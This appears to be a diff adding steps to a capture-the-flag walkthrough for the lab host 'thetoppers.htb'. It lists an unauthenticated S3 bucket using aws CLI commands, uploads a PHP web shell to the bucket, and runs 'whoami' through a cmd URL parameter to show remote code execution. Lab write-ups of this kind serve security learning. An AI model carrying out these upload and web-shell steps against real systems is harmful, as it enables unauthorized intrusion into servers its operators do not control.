@@ -157,3 +157,52 @@ After the installation, We run `aws configure` and provide any value for the con
 
 Dummy credentials were accepted, indicating no authentication enforcement.
 
+**Enumerating Buckets**
+We search for the list of available S3 Buckets for our endpoint using the following command:
+
+<pre>aws --endpoint=http://s3.thetoppers.htb s3 ls</pre>
+
+
+Discovered bucket:
+
+thetoppers.htb
+
+![AWS Endpoint](img/aws-endpoint.jpg)
+
+
+To access the available Bucket (thetoppers.htb) we will run the following command:
+
+<pre>aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb</pre>
+
+
+Revealed:
+
+index.php
+
+.htaccess
+
+images/
+
+![AWS list](img/aws-list.jpg)
+
+This confirms that the S3 bucket backs the web application, PHP is running the website and 'images' is hosting the images displayed on the website. 
+
+## Exploitation: Remote Code Execution via File Upload
+
+We uploaded a simple PHP web shell:
+
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
+
+
+Accessing it via browser allowed command execution:
+
+http://thetoppers.htb/shell.php?cmd=whoami
+
+
+Result:
+
+www-data
+
+
+This confirms successful RCE.
+
